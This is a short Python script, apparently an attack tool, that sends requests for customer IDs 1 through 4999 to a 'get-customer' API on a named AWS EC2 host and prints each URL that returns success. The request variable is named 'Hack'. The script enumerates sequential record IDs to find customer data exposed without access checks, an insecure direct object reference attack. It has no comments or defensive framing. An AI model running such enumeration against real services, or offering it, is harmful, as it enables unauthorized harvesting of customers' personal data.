import requests

for i in range(1,5000):
    link = f"http://ec2-3-108-196-161.ap-south-1.compute.amazonaws.com/api/get-customer?id={i}"
    Hack = requests.get(url=link)
    if Hack.status_code == 200:
        print(link)